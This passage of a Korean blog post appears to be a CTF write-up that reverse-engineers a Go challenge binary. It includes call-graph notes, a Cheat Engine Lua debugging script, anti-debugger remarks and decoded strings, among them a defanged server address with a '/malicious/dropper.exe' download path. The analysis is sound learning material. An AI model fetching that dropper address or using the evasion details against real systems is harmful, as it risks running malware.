&lt;p&gt;그래프가 안 떠서 생각해 보니 이 바이너리는 함수가 한 만 개 정도 되는 바이너리였고&lt;/p&gt;

&lt;p&gt;큰일났음을 눈치챘을 땐 이미 컴퓨터가 죽은 뒤였다&lt;/p&gt;

&lt;p&gt;다들 golang 프로그램을 분석할 땐 조심하도록 하자&lt;/p&gt;

&lt;p&gt;이것들은 컴퓨터 암살자다&lt;/p&gt;

&lt;p&gt;이상.&lt;/p&gt;

&lt;p&gt;은 무슨… 리버싱은 노가다다&lt;/p&gt;

&lt;p&gt;그래서 수동으로 분석했다.&lt;/p&gt;

&lt;p&gt;open subviews → function calls를 보더라도 알 수 없는 게 있다. 예를 들어 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lea rcx, {function}&lt;/code&gt; 이후에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call rcx&lt;/code&gt; 가 오는 경우가 그렇다.&lt;/p&gt;

&lt;p&gt;그래서 교차검증을 진행해 최대한 완전하게 콜관계를 분석했다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;main
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;WDecode&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;없음(runtime에서 콜함)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;WDecode
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;없음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;main&lt;/li&gt;
          &lt;li&gt;run&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;run
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;WDecode&lt;/li&gt;
          &lt;li&gt;DownloadFile&lt;/li&gt;
          &lt;li&gt;run_Printf_func2&lt;/li&gt;
          &lt;li&gt;run_deferwrap1&lt;/li&gt;
          &lt;li&gt;run_Printf_func1&lt;/li&gt;
          &lt;li&gt;run_Printf_func3&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;run&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;run_deferwrap1
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;없음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;run&lt;/li&gt;
          &lt;li&gt;run_deferwrap1&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;run_Printf_func1
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;없음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;run&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;run_Printf_func2
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;없음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;run&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;run_Printf_func3
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;없음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;run&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;DownloadFile
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;DownloadFile_deferwrap1&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;run&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;DownloadFile_deferwrap1
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;없음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;DownloadFile&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;위 결과를 보면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_run&lt;/code&gt;이 가장 핵심 함수인 것으로 보인다.&lt;/p&gt;

&lt;p&gt;그러나 궁금한 점, 대체 뭐가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_run&lt;/code&gt;을 콜하는 걸까? 사실 모르겠음… &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_main&lt;/code&gt;이 엔트리인데 왜 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_run&lt;/code&gt;과 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_main&lt;/code&gt; 간의 관계는 안 보이는 거지?&lt;/p&gt;

&lt;p&gt;이건 동적 분석하면서 알아보기로 했음&lt;/p&gt;

&lt;p&gt;은 그냥 원라인 디버깅하면 알수있을듯…&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;14-동적-분석&quot;&gt;1.4. 동적 분석&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%204.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;일단 함수 오프셋을 계산하기 위한 기본 정보 세이브해두고&lt;/p&gt;

&lt;p&gt;Cheat Engine에서 prob.exe를 실행시키거나, 실행중인 prob.exe에 attach하거나 해야 하는데&lt;/p&gt;

&lt;p&gt;전자는 안됨 왜 안될까&lt;/p&gt;

&lt;p&gt;후자는 cmd에서 실행하면 됨&lt;/p&gt;

&lt;p&gt;그러나 IDA를 켠 채로 후자를 시도하면 안티디버거에 걸리기 때문에 prob.exe가 바로 죽어버림&lt;/p&gt;

&lt;p&gt;즉 치트엔진을 붙일 수 없음&lt;/p&gt;

&lt;p&gt;따라서 IDA를 끄고 하시길 바랍니다&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%205.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x75ee80&lt;/code&gt;이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_run&lt;/code&gt; 함수의 시작 주소였고 베이스는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400000&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;그럼 오프셋은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x35ee80&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;141-실패-기록&quot;&gt;1.4.1. 실패 기록&lt;/h3&gt;

&lt;p&gt;치트엔진으로 별짓을 다했음&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;cmd에서 exec되는 흐름을 보고 싶어서 x96dbg 붙였음&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;→ cmd는 권한 문제로 디버깅이 어려움&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;그래서 한 생각: prob가 콜하는 dll을 전부 확인하자&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;→ 사유: 얘가 지금 http 통신 열려다가 server가 안 열어줘서 오류가 나고 죽는 거니까, http 통신의 오류를 담당하는 dll을 따라가면 bp를 걸 수 있겠지&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;prob가 콜하는 dll 리스트&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%206.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powerprof.dll&lt;/code&gt;: 머신의  전원에 관한 기능을 주관하는 dll&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ucrtbase.dll&lt;/code&gt;: Universal C 런타임&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcrt4.dll&lt;/code&gt;: RPC를 지원하며, 보통 네트워크 및 인터넷 통신을 구현할 때 사용&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UMPDC.dll&lt;/code&gt;: 유저 모드에서의 전원 의존성 조정을 위해 사용됨&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ws2_32.dll&lt;/code&gt;: 소켓 통신에 사용됨&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mswsock.dll&lt;/code&gt;: TCP/IP 프로토콜을 통해 인터넷 통신을 하기 위해 사용됨&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;실패!!!!!!!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;142-성공&quot;&gt;1.4.2. 성공!&lt;/h3&gt;

&lt;p&gt;그래서 다른 방법을 씀&lt;/p&gt;

&lt;p&gt;프로그램을 보면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_DownloadFile&lt;/code&gt;에 넘기는 파라미터 중 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDecode(…, main_encoded_filepath)&lt;/code&gt; 가 있음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%207.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_encoded_filepath&lt;/code&gt;는 static으로 정의된 문자열의 시작을 가리키는 포인터를 저장하고 있음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%208.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, 이 문자열이 Decoding을 거쳐서 어떤 문자열이 되는지 알아내면 되므로&lt;/p&gt;

&lt;p&gt;위 문자열의 시작 주소에 어떤 인스트럭션이 접근하는지를 알아내면 그쪽에서 Decoding된 문자열을 알아낼 수 있을 것임&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%209.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;인간승리&lt;/p&gt;

&lt;p&gt;ida상에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dec_download_path&lt;/code&gt;가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDecode&lt;/code&gt;의 결과를 받는 것으로 나와 있기 때문에, 이게 메모리상의 어떤 부분에 있는지 확인해 보는 게 좋을 것 같음.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2010.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;저기다가 bp걸고 메모리에 어떤 값이 왔다갔다하는지 알고싶은데&lt;/p&gt;

&lt;p&gt;어떻게 해야 시작할 때부터 bp를 걸 수 있지?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;→ 충분히 민첩하면 됨(원라인 디버깅)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;따라서 lua 스크립트로 프로세스 실행한 다음 홀드 걸어놓고 디버거를 어태치해서 bp걸은 다음 메모리 뷰를 띄우도록 해 보았음&lt;/p&gt;

&lt;div class=&quot;language-lua highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- prob.exe 실행 및 브레이크포인트 설정&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- 파일 실행 및 프로세스 Attach&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:\\Users\\toubv\\Desktop\\fiesta2024\\S-2\\prob.exe&quot;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;-- prob.exe의 절대 경로를 지정하세요.&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;success&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellExecute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;processPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;-- 프로그램 실행&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- 잠시 대기 (프로세스 실행 및 메모리 준비 시간 확보)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- 프로세스에 Attach&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;prob.exe&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;openProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;processName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;prob.exe 프로세스에 Attach 완료!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;프로세스를 찾을 수 없습니다. Attach 실패.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- 엔트리 포인트 주소 찾기&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;modules&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enumModules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;baseAddress&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;nil&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ipairs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;string.lower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processName&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;baseAddress&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Address&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;string.format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;모듈 베이스 주소: 0x%X&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;baseAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- 엔트리 포인트에 브레이크포인트 설정&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entryPoint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;baseAddress&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;-- PE 헤더 분석이 필요하면 여기에 오프셋 추가&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;debug_setBreakpoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;entryPoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x35f580&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;string.format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;엔트리 포인트 (0x%X)에 브레이크포인트가 설정되었습니다.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entryPoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x35f580&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- 메모리 뷰 띄움&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;openMemoryView&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;치트엔진 안써봐서 메뉴부터 막 누르고 다녔는데&lt;/p&gt;

&lt;p&gt;거기에서 lua script 보자마자 이걸 언젠가 쓰겠군 했음&lt;/p&gt;

&lt;p&gt;그런데 이렇게 빠르게 쓰게 될 줄은 몰랐음&lt;/p&gt;

&lt;p&gt;결과&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2011.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;prob.exe+35f580&lt;/code&gt;은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dec_downloadPath&lt;/code&gt;에 파일 다운로드 경로를 저장하기 위해  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDecode&lt;/code&gt;를 콜하는 부분으로, 해당 과정을 거치고 나면 디코딩된 경로가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dec_downloadPath&lt;/code&gt;에 저장될 것임&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://tip.golang.org/src/cmd/compile/abi-internal#:~:text=Function%20call%20argument%20and%20result%20passing%C2%B6&quot;&gt;go로 컴파일된 프로그램의 어셈블리 규칙&lt;/a&gt;에 따르면 함수의 리턴값은 레지스터에 저장될 확률이 높으니&lt;sup id=&quot;fnref:result_passing&quot;&gt;&lt;a href=&quot;#fn:result_passing&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot; role=&quot;doc-noteref&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 레지스터부터 확인해 보는 게 좋을 것 같았고, 레지스터 중 스택 및 힙에 할당된 메모리 영역(메모리 덤프에서 명시된 Base와 Size 감안할 때)에 포함되는 주소를 가진 레지스터를 하나하나 확인해 보니, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://43[.]200.152.71:10311&lt;/code&gt; 문자열을 확인할 수 있었음&lt;/p&gt;

&lt;p&gt;추가로, 다음 루틴에서 콜하는 함수(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_downloadFile&lt;/code&gt;)를 따라간 다음 리턴값이 담긴 rax를 확인해 보니, 다음과 같은 문자열을 확인할 수 있었고&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2012.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;43[.]200.152.71:10311/malicious/dropper.exe&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;그 다음에 다시 한 번 콜되는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDecode&lt;/code&gt; 함수가 무엇을 리턴하는지도 확인해 봄&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2013.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;43[.]200.152.71:10311/tmp/flag1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;즉, 총 2개의 파일을 2번의 요청에 걸쳐 요청한다는 걸 알 수 있었음&lt;/p&gt;

&lt;p&gt;근데 사실 이런 건 샌드박스에 먼저 돌려보는 게 좋아서… 그리고 문제 파일에는 안티샌드박스가 안 걸려 있어서 돌리면 그냥 바로 나온다. 난 그렇게 풀었고…&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-번외-ida-오류-고치기&quot;&gt;2. 번외: IDA 오류 고치기&lt;/h1&gt;

&lt;h2 id=&quot;21-main_main-함수-분석&quot;&gt;2.1. main_main 함수 분석&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2014.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime_morestack_noctxt_abi0&lt;/code&gt; 함수는 커스텀 함수가 아닌 것으로 추정됨(검색 결과 다른 대회의 리버싱 문제에서도 확인)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;github_com_CRYBOII_buggi_SimpleRun();&lt;/code&gt; 함수는 안티디버거 함수 실행부&lt;/li&gt;
  &lt;li&gt;따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDcode(v0,v1)&lt;/code&gt;부터 분석 시작&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;22-main_wdcodev0-v1-함수-분석&quot;&gt;2.2. main_WDcode(v0, v1) 함수 분석&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2015.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;함수 호출을 잘못 인식한 결과라고 하니, 해당 라인으로 가서 함수 콜의 형태를 올바르게 고쳐줘야 한다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDcode(v0, v1)&lt;/code&gt;은 인자 2개를 받아서 시작&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDcode&lt;/code&gt; 내부에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt;와 값을 상호작용하는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;machine&lt;/code&gt; 관련 요소는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbx&lt;/code&gt; 레지스터 2개
    &lt;ol&gt;
      &lt;li&gt;왜냐하면 함수는 외부에서 파라미터를 전달받으면 함수 내부에서 사용하기 위해 스택 프레임 내에 값을 전달해놓기 때문임&lt;/li&gt;
      &lt;li&gt;물론 이 점은 콜링 컨벤션이 달라지면 달라지겠지만, 어쨌든 저 2개 레지스터가 수상한 건 맞음&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;문제가 발생한 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x75f5a6&lt;/code&gt; 라인에서는 아래와 같이 함수를 콜하고 있었음&lt;/p&gt;

